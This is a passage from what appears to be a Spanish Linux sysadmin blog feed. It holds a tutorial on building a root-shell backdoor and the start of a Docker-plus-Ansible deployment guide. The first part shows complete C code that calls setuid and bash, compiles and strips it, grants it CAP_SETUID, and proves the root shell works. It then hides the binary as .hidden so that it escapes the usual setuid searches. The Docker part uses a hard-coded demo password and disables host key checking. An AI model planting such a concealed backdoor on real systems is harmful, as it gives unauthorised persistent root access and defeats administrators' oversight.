&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat root_shell.c
int main&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    setuid&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La compilación no tiene ningún misterio; lo compilamos con &lt;strong&gt;gcc&lt;/strong&gt; y le pasamos un &lt;strong&gt;strip&lt;/strong&gt; para reducir el tamaño al máximo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ gcc -o root_shell root_shell.c
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ strip root_shell
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si tratamos de ejecutarlo, veremos que la llamada para escalar a &lt;em&gt;root&lt;/em&gt; ha sido ignorada; el usuario que hemos usado no tiene permisos para hacer eso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./root_shell
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ id
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a darle la &lt;em&gt;capability&lt;/em&gt; &lt;strong&gt;CAP_SETUID&lt;/strong&gt;. Además, le pondremos los flags &lt;em&gt;effective&lt;/em&gt; y &lt;em&gt;permitted&lt;/em&gt;, que darán la &lt;em&gt;capability&lt;/em&gt; automáticamente y lo pasará a los procesos hijos. Mas información en &lt;a href="http://linux.die.net/man/7/capabilities"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: he usado &lt;strong&gt;sudo&lt;/strong&gt; para hacer esta operación, pero como no tendremos esto en producción, tendremos que esperar una intervención en donde nos concedan ese permiso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ sudo setcap cap_setuid+ep root_shell
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ejecutando el binario, vemos que hemos obtenido lo que esperábamos; un binario que nos deja ante una línea de comandos con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./root_shell
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# id&lt;/span&gt;
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que no hay permisos especiales tipo &lt;em&gt;setuid&lt;/em&gt;, con lo que no pueden encontrarlo con el &lt;strong&gt;find&lt;/strong&gt; habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ls -lh
total 12K
-rwxrwxr-x. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard &lt;span class="m"&gt;4&lt;/span&gt;.3K Mar &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;18&lt;/span&gt;:01 root_shell
-rw-rw-r--. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard   &lt;span class="m"&gt;50&lt;/span&gt; Mar &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:59 root_shell.c
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a intentar ocultar lo que nos delataría a simple vista; eliminamos el innecesario código fuente y ocultaremos el binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ rm root_shell.c
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ mv root_shell .hidden
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos que sigue funcionando, y que tiene la &lt;em&gt;capability&lt;/em&gt; que le hemos dado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./.hidden
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# id&lt;/span&gt;
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ getpcaps .hidden
Capabilities &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="sb"&gt;`&lt;/span&gt;.hidden&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;=&lt;/span&gt; cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="shell"></category><category term="root"></category><category term="capabilities"></category></entry><entry><title>Controlando contenedores docker con ansible</title><link href="http://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html" rel="alternate"></link><published>2016-06-06T08:00:00+02:00</published><updated>2016-06-06T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-06-06:/2016/06/controlando-contenedores-docker-con-ansible.html</id><summary type="html">&lt;p&gt;La facilidad de levantar un contenedor &lt;strong&gt;docker&lt;/strong&gt; nos lleva a la pregunta del millón: ¿es posible usar &lt;strong&gt;docker&lt;/strong&gt; para crear contenedores de usar y tirar para probar otras tecnologías? La respuesta es que sí, y para demostrarlo, vamos a generar un entorno minimalista en contenedores &lt;strong&gt;docker&lt;/strong&gt;, desplegados mediante &lt;strong&gt;ansible&lt;/strong&gt; &lt;em&gt;playbooks …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;La facilidad de levantar un contenedor &lt;strong&gt;docker&lt;/strong&gt; nos lleva a la pregunta del millón: ¿es posible usar &lt;strong&gt;docker&lt;/strong&gt; para crear contenedores de usar y tirar para probar otras tecnologías? La respuesta es que sí, y para demostrarlo, vamos a generar un entorno minimalista en contenedores &lt;strong&gt;docker&lt;/strong&gt;, desplegados mediante &lt;strong&gt;ansible&lt;/strong&gt; &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: De acuerdo con el autor de &lt;strong&gt;docker&lt;/strong&gt;, nunca deberíais poner &lt;strong&gt;SSH&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt; (artículo &lt;a href="https://jpetazzo.github.io/2014/06/23/docker-ssh-considered-evil/"&gt;aquí&lt;/a&gt;). Sin embargo, hoy vamos a hacer una excepción para esta demostración.&lt;/p&gt;
&lt;h2&gt;Las imágenes base&lt;/h2&gt;
&lt;p&gt;La idea es que vamos a levantar una serie de máquinas y vamos a dejar que &lt;strong&gt;ansible&lt;/strong&gt; las provisiones mediante &lt;em&gt;playbooks&lt;/em&gt;; para ello necesitamos una imagen base. También vamos a crear una imagen que solo sirva para ejecutar &lt;strong&gt;ansible&lt;/strong&gt;, que vamos a crear y a destruir según lo necesitemos.&lt;/p&gt;
&lt;p&gt;Vamos a empezar creando la imagen &lt;em&gt;master&lt;/em&gt;, que contiene la herramienta &lt;strong&gt;ansible&lt;/strong&gt; (vamos a poner una versión superior desde los &lt;em&gt;backports&lt;/em&gt;) y sus dependencias. Este es nuestro &lt;em&gt;Dockerfile&lt;/em&gt; y el fichero &lt;em&gt;ansible.cfg&lt;/em&gt; que va a gobernarlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat ansible.cfg 
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
gerard@sirius:~/build$ cat Dockerfile.master 
FROM debian:jessie-backports
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y openssh-client sshpass nano
RUN apt-get install -y -t jessie-backports ansible
ADD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ansible.cfg&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/root/.ansible.cfg&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen mediante el comando &lt;em&gt;build&lt;/em&gt; y le ponemos el &lt;em&gt;tag&lt;/em&gt; "master".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -f Dockerfile.master -t master .
Sending build context to Docker daemon &lt;span class="m"&gt;4&lt;/span&gt;.096 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie-backports
 ---&amp;gt; 99552579b6f6
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y openssh-client sshpass nano
 ---&amp;gt; Running in 6e311500cbeb
...
 ---&amp;gt; d014d43ddf74
Removing intermediate container 6e311500cbeb
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN apt-get install -y -t jessie-backports ansible
 ---&amp;gt; Running in d047144fce1b
...
 ---&amp;gt; 10881f414b84
Removing intermediate container d047144fce1b
Step &lt;span class="m"&gt;4&lt;/span&gt; : ADD ansible.cfg /root/.ansible.cfg
 ---&amp;gt; 08fd2580e558
Removing intermediate container c6b3c29e8682
Step &lt;span class="m"&gt;5&lt;/span&gt; : CMD /bin/bash
 ---&amp;gt; Running in 7b1199ff749f
 ---&amp;gt; 58689ad42e3e
Removing intermediate container 7b1199ff749f
Successfully built 58689ad42e3e
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a crear la imagen para las máquinas controladas, mediante un &lt;em&gt;Dockerfile&lt;/em&gt; creado a tal efecto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat Dockerfile.slave 
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y python openssh-server sudo &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    useradd ansible -G sudo -s /bin/bash -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ansible:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /var/run/sshd
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nuevamente lanzamos el &lt;em&gt;build&lt;/em&gt; con el &lt;em&gt;tag&lt;/em&gt; "slave".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -f Dockerfile.slave -t slave .
Sending build context to Docker daemon &lt;span class="m"&gt;4&lt;/span&gt;.096 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie
 ---&amp;gt; bb5d89f9b6cb
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y python openssh-server sudo &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     useradd ansible -G sudo -s /bin/bash -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ansible:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /var/run/sshd
 ---&amp;gt; Running in ecc6f15ffdc1
...
 ---&amp;gt; ecd77bdcc643
Removing intermediate container ecc6f15ffdc1
Step &lt;span class="m"&gt;3&lt;/span&gt; : CMD /usr/sbin/sshd -D
 ---&amp;gt; Running in 09b2642eb314
 ---&amp;gt; 306389180c9f
Removing intermediate container 09b2642eb314
Successfully built 306389180c9f
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que tenemos ambas imágenes preparadas para crear nuestros contenedores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
slave               latest              306389180c9f        &lt;span class="m"&gt;5&lt;/span&gt; seconds ago       &lt;span class="m"&gt;186&lt;/span&gt; MB
master              latest              58689ad42e3e        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       &lt;span class="m"&gt;245&lt;/span&gt;.4 MB
debian              jessie-backports    99552579b6f6        &lt;span class="m"&gt;6&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
debian              jessie              bb5d89f9b6cb        &lt;span class="m"&gt;6&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando los contenedores necesarios&lt;/h2&gt;
&lt;p&gt;La idea es que vamos a crear un micro entorno compuesto por dos servidores y un balanceador, que es la fachada del sistema. La salida de cada petición web va a indicar el nombre de la máquina que la sirvió, para poder comprobar que balancea adecuadamente.&lt;/p&gt;
&lt;p&gt;Los &lt;em&gt;flags&lt;/em&gt; de ejecución son &lt;em&gt;--name&lt;/em&gt; (el nombre con el que nos referiremos en los comandos &lt;em&gt;docker&lt;/em&gt;), el &lt;em&gt;-h&lt;/em&gt; (para dar un nombre de sistema operativo a la máquina), el &lt;em&gt;-d&lt;/em&gt; (&lt;em&gt;detach&lt;/em&gt;, para que no nos bloquee el terminal) y la imagen &lt;em&gt;slave&lt;/em&gt; que tiene instalados &lt;strong&gt;ssh&lt;/strong&gt;, &lt;strong&gt;python&lt;/strong&gt; y &lt;strong&gt;sudo&lt;/strong&gt;. Adicionalmente la imagen del balanceador &lt;em&gt;publica&lt;/em&gt; su puerto 80 en el puerto 8000 de la máquina &lt;em&gt;host&lt;/em&gt;, para poder acceder por &lt;strong&gt;HTTP&lt;/strong&gt; desde nuestra máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run --name balancer -h balancer -d -p &lt;span class="m"&gt;8000&lt;/span&gt;:80 slave
7a80942c69a70e729fc7090983fc59735fd0c10818a5b62b64a26a98e58fc101
gerard@sirius:~/build$ docker run --name server1 -h server1 -d slave
745acb30c5c1b7067a15f593dfefce3e769d2a7b5423f001b6a080296c3aeb3f
gerard@sirius:~/build$ docker run --name server2 -h server2 -d slave
a469c0f69bb42a3c979037b125750a4cc1bf01750c24bd7cef277b9b6e7dc2d0
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante anotar las direcciones IP de las máquinas, para saber qué tenemos en cada sitio. Esta información nos sirve para montar la configuración del balanceador y para el inventario de &lt;strong&gt;ansible&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker inspect balancer &lt;span class="p"&gt;|&lt;/span&gt; grep IPAddress
            &lt;span class="s2"&gt;&amp;quot;SecondaryIPAddresses&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.2&amp;quot;&lt;/span&gt;,
                    &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.2&amp;quot;&lt;/span&gt;,
gerard@sirius:~/build$ docker inspect server1 &lt;span class="p"&gt;|&lt;/span&gt; grep IPAddress
            &lt;span class="s2"&gt;&amp;quot;SecondaryIPAddresses&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.3&amp;quot;&lt;/span&gt;,
                    &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.3&amp;quot;&lt;/span&gt;,
gerard@sirius:~/build$ docker inspect server2 &lt;span class="p"&gt;|&lt;/span&gt; grep IPAddress
            &lt;span class="s2"&gt;&amp;quot;SecondaryIPAddresses&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.4&amp;quot;&lt;/span&gt;,
                    &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.4&amp;quot;&lt;/span&gt;,
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos crear un contenedor de la imagen &lt;em&gt;master&lt;/em&gt; que tiene &lt;strong&gt;ansible&lt;/strong&gt; para &lt;em&gt;empujar&lt;/em&gt; los &lt;em&gt;playbooks&lt;/em&gt; a las &lt;em&gt;slaves&lt;/em&gt;. Esta máquina es de "usar y tirar".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run -ti --rm -h ansible master
root@ansible:/# &lt;span class="nb"&gt;cd&lt;/span&gt; /root/
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Manos a la obra: los playbooks&lt;/h2&gt;
&lt;p&gt;Este punto es similar al uso de &lt;strong&gt;ansible&lt;/strong&gt; sin &lt;strong&gt;docker&lt;/strong&gt;. Se trata de definir el fichero de &lt;em&gt;hosts&lt;/em&gt;, los &lt;em&gt;playbooks&lt;/em&gt; y los ficheros que estos puedan necesitar. En este caso concreto, vemos que necesitamos (&lt;em&gt;hosts&lt;/em&gt; y &lt;em&gt;playbooks&lt;/em&gt; aparte) la aplicación &lt;strong&gt;python&lt;/strong&gt; que vamos a servir, la configuracion para &lt;strong&gt;uwsgi&lt;/strong&gt; y la configuración del balanceador.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- balancer.yml
&lt;span class="p"&gt;|&lt;/span&gt;-- files
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;|&lt;/span&gt;-- balancer
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;|&lt;/span&gt;-- myapp.ini
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="sb"&gt;`&lt;/span&gt;-- myapp.py
&lt;span class="p"&gt;|&lt;/span&gt;-- hosts
&lt;span class="sb"&gt;`&lt;/span&gt;-- servers.yml

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;6&lt;/span&gt; files
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un paso necesario es crear el fichero de &lt;em&gt;hosts&lt;/em&gt;, que incluye los grupos, los contenedores que los forman y los parámetros de conexión a los mismos (como los declaramos en los &lt;em&gt;Dockerfiles&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts 
&lt;span class="o"&gt;[&lt;/span&gt;all:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t

&lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2

&lt;span class="o"&gt;[&lt;/span&gt;servers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Los servidores de aplicaciones&lt;/h3&gt;
&lt;p&gt;La idea es que este grupo va a servir una aplicación &lt;strong&gt;python&lt;/strong&gt; mediante el servidor &lt;strong&gt;uwsgi&lt;/strong&gt;. Esta aplicación es un ejemplo muy simple, que se limita a indicar el &lt;em&gt;hostname&lt;/em&gt; de la máquina, en forma de saludo. Esta aplicación se sirve en el puerto TCP 8080. Estos son el &lt;em&gt;playbook&lt;/em&gt; y los ficheros necesarios para su ejecución:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat files/myapp.py 
import os

def application&lt;span class="o"&gt;(&lt;/span&gt;environ, start_response&lt;span class="o"&gt;)&lt;/span&gt;:
    start_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)])&lt;/span&gt;
    yield &lt;span class="s1"&gt;&amp;#39;Hello from %s\n&amp;#39;&lt;/span&gt; % os.uname&lt;span class="o"&gt;()[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
root@ansible:~# cat files/myapp.ini 
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
http-socket &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
